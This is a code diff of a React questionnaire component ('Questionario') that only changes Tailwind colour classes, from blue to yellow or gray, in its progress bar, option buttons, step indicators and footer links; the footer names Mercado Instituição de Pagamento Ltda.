@@ -108,14 +108,14 @@ function Questionario() {
 
       {/* Decorative circles */}
       <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
-      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />
+      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />
 
       <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
         <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
           {/* Progress bar */}
           <div className="w-full h-1.5 bg-gray-200 rounded-full mb-6 overflow-hidden">
             <div
-              className="h-full bg-[#3483FA] transition-all duration-500"
+              className="h-full bg-[#FFE600] transition-all duration-500"
               style={{ width: `${progress}%` }}
             />
           </div>
@@ -139,8 +139,8 @@ function Questionario() {
                     onClick={() => handleSelect(opt.label)}
                     className={
                       step.columns === 2
-                        ? "border border-gray-200 rounded-lg p-4 flex flex-col items-center justify-center gap-3 hover:border-[#3483FA] hover:bg-[#FFF8E1] transition-all"
-                        : "border border-gray-200 rounded-lg p-4 text-left text-gray-800 font-medium hover:border-[#3483FA] hover:bg-[#FFF8E1] transition-all"
+                        ? "border border-gray-200 rounded-lg p-4 flex flex-col items-center justify-center gap-3 hover:border-[#FFE600] hover:bg-[#FFF8E1] transition-all"
+                        : "border border-gray-200 rounded-lg p-4 text-left text-gray-800 font-medium hover:border-[#FFE600] hover:bg-[#FFF8E1] transition-all"
                     }
                   >
                     {opt.icon && step.columns === 2 && (
@@ -178,19 +178,19 @@ function Questionario() {
                       key={label}
                       className={`flex items-center justify-between p-3 rounded-lg border ${
                         done
-                          ? "border-[#3483FA] bg-[#FFF8E1]"
+                          ? "border-[#FFE600] bg-[#FFF8E1]"
                           : active
-                          ? "border-[#3483FA] bg-[#FFF8E1]"
+                          ? "border-[#FFE600] bg-[#FFF8E1]"
                           : "border-gray-200 bg-gray-50"
                       }`}
                     >
                       <span className="text-sm font-medium text-gray-800">{label}</span>
                       {done ? (
-                        <span className="w-6 h-6 rounded-full bg-[#3483FA] flex items-center justify-center">
+                        <span className="w-6 h-6 rounded-full bg-[#FFE600] flex items-center justify-center">
                           <i className="fas fa-check text-white text-xs" />
                         </span>
                       ) : active ? (
-                        <i className="fas fa-spinner fa-spin text-[#3483FA]" />
+                        <i className="fas fa-spinner fa-spin text-gray-900" />
                       ) : (
                         <span className="text-xs text-gray-500">Aguardando</span>
                       )}
@@ -207,8 +207,8 @@ function Questionario() {
         <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
         <p className="mt-1">
           CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
-          <a href="#" className="text-[#3483FA]">Privacidade</a>
+          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
+          <a href="#" className="text-gray-900">Privacidade</a>
         </p>
       </footer>
     </div>
